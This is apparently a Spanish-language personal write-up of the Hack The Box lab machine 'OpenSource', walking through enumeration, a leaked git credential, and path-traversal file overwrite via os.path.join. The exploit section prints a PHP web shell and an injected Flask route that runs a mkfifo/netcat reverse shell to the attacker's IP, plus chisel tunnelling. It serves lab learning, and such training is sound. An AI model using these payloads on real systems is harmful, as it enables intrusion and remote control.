---
title: OpenSource WriteUp
date: 2023-05-11
categories: [WriteUps, Máquinas Linux]
tags: [código, Python, git, docker, Reverse Shell, Remote Port Forwarding]
image:
  path: ../../assets/img/writeups/OpenSource/OpenSource.png
  width: 528
  height: 340
  alt: Banner OpenSource
---

Tenemos los puertos 22/ssh y 80/http abiertos. Desde el servicio web nos comparten el código fuente de la aplicación. Desde este código vemos una función, la os.path.join que puede ser vulnerable. Nos aprovechamos de ello para escribir en un fichero local del objetivo que al llamarlo nos otorga una reverse shell. Gracias a esto accedemos a un docker.  
 En este docker vuelvo a enumerar puertos de la máquina objetivo y encuentro el puerto 3000 abierto. Uso chisel para hacer un remote port forwarding para visualizarlo desde mi ordenador. Hay una web que corre el servicio Gitea. Con unas credenciales que había conseguido de antes accedo al panel de Gitea y consigo una id_rsa con la que debería poder conectarme a la máquina objetivo pero no me funciona.

## Reconocimiento

La caja que pentestearemos hoy se llama OpenSource y su dirección IP es `10.10.11.164`.

Lo primero comprobaremos que tenemos conexión a la máquina.
```
❯ ping -c 1 10.10.11.164
PING 10.10.11.164 (10.10.11.164) 56(84) bytes of data.
64 bytes from 10.10.11.164: icmp_seq=1 ttl=63 time=41.0 ms

--- 10.10.11.164 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 41.021/41.021/41.021/0.000 ms
```
Y guay, un paquete envíado y un paquete recibido.

Con la herramienta nmap haré un escaneo de la máquina para ver que puertos hay abiertos.
```
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.164 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-01 16:34 CEST
Initiating SYN Stealth Scan at 16:34
Scanning 10.10.11.164 [65535 ports]
Discovered open port 22/tcp on 10.10.11.164
Discovered open port 80/tcp on 10.10.11.164
Completed SYN Stealth Scan at 16:34, 12.23s elapsed (65535 total ports)
Nmap scan report for 10.10.11.164
Host is up, received user-set (0.042s latency).
Scanned at 2023-05-01 16:34:19 CEST for 12s
Not shown: 65493 closed tcp ports (reset), 40 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 62

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.49 seconds
           Raw packets sent: 67271 (2.960MB) | Rcvd: 65515 (2.621MB)
```
Esto significan las opciones:

* -p- : Escanea todos los puertos. Hay un total de 65535 puertos
* --open : Muestra únicamente los puertos abiertos.
* -sS : Realiza un TCP SYN Scan
* --min-rate 5000 : Para enviar paquetes no más lentos que 5000 paquetes por segundo
* -vvv : Muestra la información en pantalla mientras se realiza el escaneo
* -n : Para no aplicar resolución DNS
* -Pn : Para que no aplique el protocolo ARP
* 10.10.11.164 : Dirección IP objetivo, la cual quiero escanear
* -oG allPorts : Exportará el output a un fichero grepeable que llamaremos "allPorts"

Nos saca los puertos 22/ssh y 80/tcp. Realizaré otro escaneo más profundo sobre estos puertos.
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA)
|   256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA)
|_  256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519)
80/tcp open  http    Werkzeug/2.1.2 Python/3.10.3
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Mon, 01 May 2023 14:37:52 GMT
|     Content-Type: text/html; charset=utf-8
```
El resultado era más amplio que lo anterior pero lo importante es lo mostrado.

## Buscando vulnerabilidades

Entonces tenemos dos puertos. Tengo que aclarar que estos reconocimientos con nmap que suelo hacer son por el protocolo TCP, ya que en la mayoría de máquinas están los puertos abiertos con ese protocolo, pero hay más protocolos como el UDP y el SCTP. Si algún día no encontraramos por TCP buscaríamos vía nmap por los otros.

Empezemos por el **puerto 80**.

Antes de entrar al navegador voy a lanzar un whatweb por terminal, que es como un wappalyzer (extensión de Firefox). Analiza las tecnologías que corre la web por detrás.

```
❯ whatweb http://10.10.11.164
http://10.10.11.164 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTTPServer[Werkzeug/2.1.2 Python/3.10.3], IP[10.10.11.164], JQuery[3.4.1], Python[3.10.3], Script, Title[upcloud - Upload files for Free!], Werkzeug[2.1.2]
```
Corre Python y Werkzeug, este último es una colección de librerías. Tengo en mente que cuando se dan estas dos puede existir la posibilidad de una ataque SSTI(Server Side Template Inyection).

Vamos a abrir el navegador y visualizar que tal se ve la página.

![Web]({{ 'assets/img/writeups/OpenSource/web.png' | relative_url }}){: .center-image }

Y un poco más abajo:

![Web-Abajo]({{ 'assets/img/writeups/OpenSource/webAbajo.png' | relative_url }}){: .center-image }

Primero voy a leer el código fuente de la página. Con el atajo de teclado `Ctrl + U` accedo rápido. Encuentro los subdirectorios /static, /download y /upcloud. Las dos últimas también se pueden ver haciendo click a enlaces de la página principal. El contenido de /static voy a obviarlo de momento porque no parece importante.  
Clicko en el enlace **Download** de la página principal y se me descarga un zip que parece tener el contenido de la aplicación que corre en la web, que parece encargarse de la subida de ficheros a su servidor.

**Pasos:** El zip lo veré más tarde. Primero voy a realizar un fuzzing, después quiero saber como funciona la app en el navegador ayudandome de burpsuite -quiero saber que se envía por detrás, en la solicitud-. Por último leere el .zip que será el código fuente de la aplicación.

Quizás nos podríamos saltar el fuzzing ya que tengo el código a mano peeero voy a hacerlo.
```
❯ wfuzz -c --hc=404 -t 150 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.11.164/FUZZ

 Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.164/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000000007:   200        130 L    420 W      5313 Ch     "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"                                                      
000000012:   200        130 L    420 W      5313 Ch     "# on at least 2 different hosts"                                                                                      
000000003:   200        130 L    420 W      5313 Ch     "# Copyright 2007 James Fisher"                                                                                        
000000009:   200        130 L    420 W      5313 Ch     "# Suite 300, San Francisco, California, 94105, USA."                                                                  
000000004:   200        130 L    420 W      5313 Ch     "#"                                                                                                                    
000000006:   200        130 L    420 W      5313 Ch     "# Attribution-Share Alike 3.0 License. To view a copy of this"                                                        
000000014:   200        130 L    420 W      5313 Ch     "http://10.10.11.164/"                                                                                                 
000000001:   200        130 L    420 W      5313 Ch     "# directory-list-2.3-medium.txt"                                                                                      
000000013:   200        130 L    420 W      5313 Ch     "#"                                                                                                                    
000000010:   200        130 L    420 W      5313 Ch     "#"                                                                                                                    
000000005:   200        130 L    420 W      5313 Ch     "# This work is licensed under the Creative Commons"                                                                   
000000002:   200        130 L    420 W      5313 Ch     "#"                                                                                                                    
000000008:   200        130 L    420 W      5313 Ch     "# or send a letter to Creative Commons, 171 Second Street,"                                                           
000000011:   200        130 L    420 W      5313 Ch     "# Priority ordered case-sensitive list, where entries were found"                                                     
000000017:   200        9802 L   92977 W    2359649 C   "download"                                                                                                                                                     
000003644:   200        45 L     144 W      1563 Ch     "console"   
```
Paro la búsqueda antes de que termine el diccionario. Veo un subdirectorio que antes no tenía; /console

Antes de intentar meterme en este subdirectorio voy a realizar otro fuzzing esta vez por archivos que terminen en las extensiones txt y php.
```
❯ wfuzz -c --hc=404 -t 150 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,txt-php http://10.10.11.164/FUZZ.FUZ2Z
```
Después de casi 100.000 palabras lo paré, no tiene pinta de que haya nada.

Entro al subdirectorio **/console** y parece ser una consola interactiva que ejecuta comandos en python, pero para operar en ella me pide un PIN que según comentan puedo encontrar en la salida estándar del shell que ejecuta el servidor. Mal asunto, voy a buscar rapidamente por la palabra PIN en el .zip descargado y si nada sigo con el esquema de búsqueda que me había propuesto antes(en pasos).

Encuentro mucho texto, para mi sin sentido, con la búsqueda `grep -ri pin` desde la carpeta .git. Y no sé porque me sale texto que no contiene la palabra, yo flipo de vez en cuando..
Veo .git en la carpeta source (la del .zip), comproboré si tienes commits anteriores. Dentro de la carpeta .git:
```
> git log

commit 2c67a52253c6fe1f206ad82ba747e43208e8cfd9 (HEAD -> public)
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:55:55 2022 +0200

    clean up dockerfile for production use

commit ee9d9f1ef9156c787d53074493e39ae364cd1e05
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:45:17 2022 +0200

    initial
```

Y hay dos commits, veamos que se ha cambiado.
```
❯ git show 2c67a52253c6fe1f206ad82ba747e43208e8cfd9

commit 2c67a52253c6fe1f206ad82ba747e43208e8cfd9 (HEAD -> public)
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:55:55 2022 +0200

    clean up dockerfile for production use

diff --git a/Dockerfile b/Dockerfile
index 76c7768..5b0553c 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -29,7 +29,6 @@ ENV PYTHONDONTWRITEBYTECODE=1
 
 # Set mode
 ENV MODE="PRODUCTION"
-# ENV FLASK_DEBUG=1
 
 # Run supervisord
 CMD ["/usr/bin/supervisord", "-c", "/etc/supervisord.conf"]
 ```
 Parece que han añadido/modificado el dockerfile. Tendré en cuenta esa ruta de /etc/supervisord.conf.

Siguiendo con la búsqueda en proyecto git voy a lanzar otros dos comandos:
```
❯ git branch
  dev
* public

❯ git checkout dev
fatal: esta operación debe ser realizada en un árbol de trabajo

❯ git tag
```
La primera es para las ramas del proyecto y la otra para averiguar si hay etiquetas, pero nada. Pensando en el error fatal de antes por el tema del árbol de trabajo pense en hacer el comando en una ruta anterior a la carpeta .git, es decir en la carpeta padre, y así funciona:
```
❯ git checkout dev
Cambiado a rama 'dev'

❯ git log --oneline
c41fede (HEAD -> dev) ease testing
be4da71 added gitignore
a76f8f7 updated
ee9d9f1 initial

❯ git diff c41fede be4da71
[Algo de texto y:]
diff --git a/app/.vscode/settings.json b/app/.vscode/settings.json
```
Esto último luego lo miraré cuando vaya a analizar el código.

Toca entender que hace la web, en principio se puede subir archivos. Sería bueno poder subir algún archivo malicioso ejecutable y llamarlo luego sabiendo la ruta donde se aloja, lo malo que mediante el fuzzing no hemos visto ninguna carpeta donde se guarden als descargas.

Esta es la pinta que tiene la página upload de la web:

![Upload]({{ 'assets/img/writeups/OpenSource/upload.png' | relative_url }}){: .center-image }

Se ve "Browse File", para localizar un fichero, y "Upload!", para subirlo, voy a dar a "upload" sin elegir archivo para subir antes y nos lleva al subdirectorio /upcloud

![Upcloud]({{ 'assets/img/writeups/OpenSource/upcloud.png' | relative_url }}){: .center-image }

A la derecha de cada ruta hay un dibujo de una terminal, pinchando en ella nos lleva a la terminal interactiva vista antes, pero se necesita un PIN.  
También se ve al principio una ruta interesante **/app/public/uploads**. Desde el navegador no llegamos a ella, probé y nada.

Ahora voy a subir un archivo tipo texto llamado text.txt.

![Subida]({{ 'assets/img/writeups/OpenSource/subida.png' | relative_url }}){: .center-image }

Te sale la dirección donde se aloja y en la palabra "file" hay un enlace al fichero. Curioso...resulta ser la ruta /uploads que probamos antes, es raro porque aunque no halla directory listing, si la página existe y hay contenido normalmente sale el mensaje de "forbidden", que significa que existe pero que no cualquiera puede entrar, y no como me sale a mi "not found" de páginas que no suelen existir.  
Pinchando en el aquí o poniendo la ruta absoluta del documento subido puedo verlo.

Intento subir un php malicioso tipo:
``` php
 <?php
 echo "<pre>" . shell_exec($_REQUEST['cmd'] . "</pre>";
 ?>
```
Pero a la hora de llamarlo no funciona, es como si le diera al botón de "Browse File"..

También paso por burpsuite la petición. Pero que yo perciba..ninguna sospecha de vulnerabilidad.

![Burpsuite]({{ 'assets/img/writeups/OpenSource/burpsuite.png' | relative_url }}){: .center-image }

Miremos el código que nos descargamos antes en el .zip.

Busco primero por palabras clave:
```
> grep -riE "password|pass"

> grep -riE "system|exec|shell_exec_popen"
```
Mucha mierda..yo no sé que cojones está grepeando. No encuentro nada útil entre tanto jaleo de letras.

Unos parrafos atrás operando en el directorio .git vimos en uno de los commits de la branch dev que había una diferencia en un fichero:  
diff --git a/app/.vscode/settings.json b/app/.vscode/settings.json

Haciendo un git show del commit encuentro una contraseña para el usuario dev01.
```
> git show be4da71
[texto por aquí y al final:]
"http.proxy": "http://dev01:Soulless_Developer#2022@10.10.10.128:5187/",
```
Me intento conectar por ssh pero nada:
```
❯ ssh dev01@10.10.11.164
The authenticity of host '10.10.11.164 (10.10.11.164)' can't be established.
ECDSA key fingerprint is SHA256:a6VljAI6pLD7/108ls+Bi5y88kWaYI6+V4lTU0KQsQU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.164' (ECDSA) to the list of known hosts.
dev01@10.10.11.164: Permission denied (publickey).
```
Vamos a leer el código que nos descargamos.

## Explotación

El script views.py parece contenter la estructura de la herramienta de subida de archivos de la web. Y hay una función, la **os.path.join** que es vulnerable.

![Views]({{ 'assets/img/writeups/OpenSource/views.png' | relative_url }}){: .center-image }

Lo que hace esta función; `os.path.join(os.getcwd(), "public", "uploads", file_name)` es formar una ruta, en este caso de subida a la web, con la ruta actual(lo que hace el os.getcwd) y añade /public/uploads/file_name. El archivo que le metes será el file_name. La vulnerabilidad consiste en que si antes del nombre de tu archivo añades una barra lateral "/" elimina toda la ruta anterior. Te muestro ejemplo:

![Join]({{ 'assets/img/writeups/OpenSource/join.png' | relative_url }}){: .center-image }

Así que debido a esto podemos añadir un archivo a la ruta que queramos, o más bien podamos, con el permiso del usuario que lleve la web. Podría añadir una nueva ruta en el archivo views.py y una nueva función en esa ruta que nos mandará una reverse a nuestro ordenador. Podría deducir gracias al código que tenemos y la distribución de las carpetas en él, que views.py puede estar en /app/app/views.py. Además vimos antes que la de uploads estaba en /app/public/uploads.

En views.py añado nueva ruta, la ruta /shell, abajo del todo:
``` python
import os

from app.utils import get_file_name
from flask import render_template, request, send_file

from app import app


@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')


@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))

@app.route('/shell')
def cmd():
    return os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.7 443 >/tmp/f")
```
Ahora interceptaré petición en burpsuite y añadiré la barra.

![Burp]({{ 'assets/img/writeups/OpenSource/burp2.png' | relative_url }}){: .center-image }

Le doy a "forward" en el burpsuite y parece que se ha subido, me sale "success" en la respuesta. Ahora si llamo a esa ruta /shell desde el navegador debería mandarme una reverse shell. Me pongo en escucha desde la terminal:
``` 
❯ nc -nlvp 443
listening on [any] 443 ...
```
Y desde el navegador `http://10.10.11.164/shell`. Todo correcto!, me llega la shell:
```
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.11.164] 39169
/bin/sh: can't access tty; job control turned off
/app # 
```
Pero estoy en un docker.

## En el docker

```
/app # ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
18: eth0@if19: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP 
    link/ether 02:42:ac:11:00:09 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.9/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```
Sé que es un docker porque las ip 172.. suelen ser dockers, y la ip 10.10.11.164 sabemos que es nuestro objetivo real.

Ahora hay que hacer un tratamiento de la tty porque no podremos manejarnos perfectamente en esta consola. Se podría tirar sin tratarla peeero vamos hacerlo bien.

Aquí el tratamiento estandar da problemas, pero podemos hacerlo con python:
```
/app # script /dev/null -c bash
/bin/sh: script: not found
/app # which python
/usr/local/bin/python
/app # which bash
/app # which sh
/bin/sh
/app # python -c 'import pty;pty.spawn("/bin/sh")'
/app # ^Z      
zsh: suspended  nc -nlvp 443
```
Y ahora en mi ordenador:
```
>stty raw -echo;fg
    reset xterm
```
Nos vuelve a dar la consola del docker y modificamos algunas variables por último:
```
/app # export TERM=xterm
/app # export SHELL=bash
/app # stty rows 38 columns 184
```
Deduzco que la ip objetivo será la 172.17.0.1, suele ser, aun así puedo mirar que equipos hay conectados en la red con el comando arp:
```
/app # arp -n
? (172.17.0.1) at 02:42:e0:b6:cc:9c [ether]  on eth0
```
La opción -n es para que no resuelva los nombres, así tarda menos. También se puede hacer de otra manera, como por ejemplo el script que hace s4vitar llamado hostDiscovery, se puede ver en la máquina **Enterprise**.

Ahora podríamos averiguar los puertos que podemos ver desde el docker. No es lo mismo los puertos abiertos de la máquina objetivo que podemos ver desde nuestra ordenador que desde un docker suyo. Lo haré usando nc(netcat).
```
/app # for port in $(seq 1 10000);do nc 172.17.0.1 $port -zv;done
172.17.0.1 (172.17.0.1:22) open
172.17.0.1 (172.17.0.1:80) open
172.17.0.1 (172.17.0.1:3000) open
```
Tenemos un nuevo puerto abierto, el 3000.

Desde mi máquina no puedo visualizar ese puerto, si fuera una web solo podría hacerlo desde un wget en terminal, pero tenemos la opción de hacer un **Remote Port Forwarding**. Es decir, hacer que mi puerto 3000 sea el de la víctima, para ello podemos usar Chisel, esta herramienta se encuentra en el github de jpillora, te vas a "releases" y te descargas el linux-amd64.  
Le doy permiso de ejecución y lo paso al docker
```
> python3 -m http.server 8040
```
Y desde el docker:
```
/tmp # wget http://10.10.14.7:8040/chisel
/tmp # chmod +x chisel
``` 
Ahora desde local ejecuto chisel como servidor, desde el docker lo ejecutaré como cliente. Desde local:
```
❯ ./chisel server --reverse -p 1212
2023/05/11 18:21:26 server: Reverse tunnelling enabled
2023/05/11 18:21:26 server: Fingerprint +U65eRfZSi769xbiDwgNfcZKeCG+SP6d6/vkciugvSQ=
2023/05/11 18:21:27 server: Listening on http://0.0.0.0:1212
```
Desde el docker me pongo como cliente:
```
/tmp # ./chisel client 10.10.14.7:1212 R:3000:172.17.0.1:3000
```
Con ese comando he resuelto que el puerto 3000 de mi Ip sea el de la máquina objetivo con ip 127.17.0.1. Lo comprobaré desde mi terminal local:
```
❯ lsof -i:3000
COMMAND  PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
chisel  8949 root    8u  IPv6  76295      0t0  TCP *:3000 (LISTEN)
```
Guay, y ahora desde mi propio navegador podré ver que hay en el puerto 3000.

![Gitea]({{ 'assets/img/writeups/OpenSource/gitea.png' | relative_url }}){: .center-image }

Nos encontramos con gitea. Buscando info por internet vemos lo que es:  
Gitea es un paquete de software de código abierto para alojar el control de versiones de desarrollo de software utilizando Git.

Hay un apartado de login "Sign in". Recuerda que habíamos encontrado hace un rato unas credenciales en un commit del git: dev01:Soulless_Developer#2022

Probamos y conseguimos entrar. Veo un dev01/home-backup y dentro de él un .ssh con una id_rsa que posiblemente sea del usuario dev01. Fantástico. Me copio la id_rsa como id_rsa y le doy el permiso 600; `chmod 600 id_rsa`. Ahora intento conectarme por ssh como dev01 usando esa id_rsa:
```
❯ ssh -i id_rsa dev01@10.10.11.164
Load key "id_rsa": invalid format
dev01@10.10.11.164: Permission denied (publickey).
```
mmmmm raaaaro, raaaro, le he dado el permiso 600 y aun así..

Mirando otros WriteUps en este punto veo que no les había dado problemas. Pruebo a conectarme con otras id_rsa que tenía de otras máquinas a esas otras máquinas y todo bien, así se debe a algún problema entiendo de la máquina objetivo.. Un problema que evita que otra máquina se pueda meter en su sistema, juuuasss.

Bueno la cuestión es que me he rayado con esta máquina..a ver si me han eliminado la auhorized_keys de la máquina objetivo y yo aquí haciendo el tonto.

Vamos a dejarlo aquí. Hay que aprender también a no tener que acabarlo todo.

Recomiendo eso sí ver la escalada porque se toca el tema de los hooks en git, que son scripts pre-commits. Se aprovechan de eso para escalar a root.

Por cierto esta máquina es más media que fácil peeeeo bueno, ha estado guay y se aprenden cosillas. 

Un saludo guapxs.









